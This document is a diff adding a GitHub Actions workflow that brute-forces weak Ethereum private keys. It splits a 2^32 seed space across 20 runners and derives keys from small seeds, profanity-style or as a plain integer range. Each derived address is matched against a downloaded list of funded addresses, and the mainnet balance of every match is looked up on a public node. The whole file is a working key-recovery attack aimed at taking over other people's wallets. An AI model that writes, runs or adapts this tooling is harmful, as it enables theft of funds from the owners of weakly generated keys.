@@ -1,0 +1,133 @@
+name: scan
+
+# Deterministic-shard weak-key scan against the local funded set.
+# No cursor, no lost chunks: runner <shard> of <shards> covers the FIXED slice
+# [start + shard*span, start + (shard+1)*span) of the seed space, so the union of all
+# runners is exactly the whole space and any one runner can be re-run for the same slice.
+# derive -> 20-byte membership (mmap binary search) -> report survivors (+ mainnet balance).
+#
+# Manual: Actions -> scan -> Run workflow. Launch all 20 shards = full 2^32 in one pass.
+
+on:
+  workflow_dispatch:
+    inputs:
+      shards:
+        description: "total shards (match the matrix size below)"
+        default: "20"
+      total:
+        description: "seed-space size (2^32 default)"
+        default: "4294967296"
+      start:
+        description: "seed-space offset"
+        default: "0"
+      campaign:
+        description: "deriver: profanity | range"
+        default: "profanity"
+      slice:
+        description: "max keys per shard (0 = whole slice)"
+        default: "0"
+
+jobs:
+  scan:
+    runs-on: ubuntu-latest
+    timeout-minutes: 240
+    strategy:
+      fail-fast: false
+      matrix:
+        shard: [0,1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19]
+    name: scan-${{ matrix.shard }}
+    steps:
+      - uses: actions/setup-python@v5
+        with:
+          python-version: "3.12"
+      - name: deps
+        run: pip install -q --disable-pip-version-check coincurve pycryptodome
+      - name: funded set (release asset)
+        run: |
+          curl -sL -o funded_eth.bin \
+            https://github.com/xoxo987/xoxo987.github.io/releases/download/funded-eth-v1/funded_eth.bin
+          echo "ab76e38f6603525c39ad9de842d31e2551cd753bd970d6a3b1cd80db1787041a  funded_eth.bin" \
+            | sha256sum -c -
+          ls -l funded_eth.bin
+      - name: scan
+        env:
+          SHARD: ${{ matrix.shard }}
+          SHARDS: ${{ inputs.shards }}
+          TOTAL: ${{ inputs.total }}
+          START: ${{ inputs.start }}
+          CAMPAIGN: ${{ inputs.campaign }}
+          SLICE: ${{ inputs.slice }}
+        run: |
+          cat > /tmp/s.py <<'PY'
+          import os, sys, time, mmap, multiprocessing as mp, json, urllib.request
+          from coincurve import PrivateKey
+          from Crypto.Hash import keccak
+
+          ORDER = 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
+          TOTAL   = int(os.environ["TOTAL"]);  START = int(os.environ.get("START") or 0)
+          SH      = int(os.environ["SHARD"]);  SHARDS = int(os.environ["SHARDS"])
+          CAMPAIGN= os.environ.get("CAMPAIGN", "profanity")
+          SLICE   = int(os.environ.get("SLICE") or 0)
+          span = TOTAL // SHARDS
+          lo, hi = START + SH * span, START + (SH + 1) * span
+          if SLICE:
+              hi = min(hi, lo + SLICE)
+
+          f = open("funded_eth.bin", "rb")
+          mm = mmap.mmap(f.fileno(), 0, access=mmap.ACCESS_READ)
+          BUF = memoryview(mm); NS = len(mm) // 20
+          print(f"shard={SH}/{SHARDS} range=[{lo},{hi}) set={NS} cores={os.cpu_count()}", flush=True)
+
+          def member(a):
+              x, y = 0, NS
+              while x < y:
+                  m = (x + y) // 2
+                  if bytes(BUF[m*20:m*20+20]) < a: x = m + 1
+                  else: y = m
+              return x < NS and bytes(BUF[x*20:x*20+20]) == a
+
+          def privkey(seed):
+              if CAMPAIGN == "range":
+                  k = seed
+              else:
+                  k = int.from_bytes(keccak.keccak_256(seed.to_bytes(8, "little")).digest(), "big")
+              k %= ORDER
+              return k or 1
+
+          def work(pair):
+              a, b = pair
+              out = []
+              for s in range(a, b):
+                  k = privkey(s)
+                  raw = k.to_bytes(32, "big")
+                  addr = keccak.keccak_256(PrivateKey(raw).public_key.format(compressed=False)[1:]).digest()[-20:]
+                  if member(addr):
+                      out.append((s, "0x" + addr.hex()))
+              return out
+
+          nc = os.cpu_count() or 1
+          step = max(1, (hi - lo) // (nc * 16))
+          tasks = [(i, min(i + step, hi)) for i in range(lo, hi, step)]
+          t0 = time.time(); found = []
+          with mp.Pool(nc) as p:
+              for r in p.imap_unordered(work, tasks, chunksize=1):
+                  if r:
+                      found += r
+                      print("  MEMBER", r, flush=True)
+          dt = time.time() - t0
+          n = hi - lo
+          print(f"=== shard {SH}: {n:,} keys in {dt/60:.1f} min ({n/dt:,.0f} keys/s) members={len(found)} ===", flush=True)
+
+          # survivors: confirm the mainnet balance straight from a public node
+          for s, addr in found:
+              try:
+                  body = json.dumps({"jsonrpc": "2.0", "id": 1, "method": "eth_getBalance",
+                                     "params": [addr, "latest"]}).encode()
+                  req = urllib.request.Request("https://ethereum-rpc.publicnode.com", body,
+                                               {"content-type": "application/json"})
+                  wei = int(json.loads(urllib.request.urlopen(req, timeout=20).read())["result"], 16)
+                  print(f"SURVIVOR {CAMPAIGN} seed={s} {addr} mainnet_eth={wei/1e18:.9f}", flush=True)
+              except Exception as e:
+                  print(f"SURVIVOR {CAMPAIGN} seed={s} {addr} balance_err={e}", flush=True)
+          PY
+          python3 /tmp/s.py
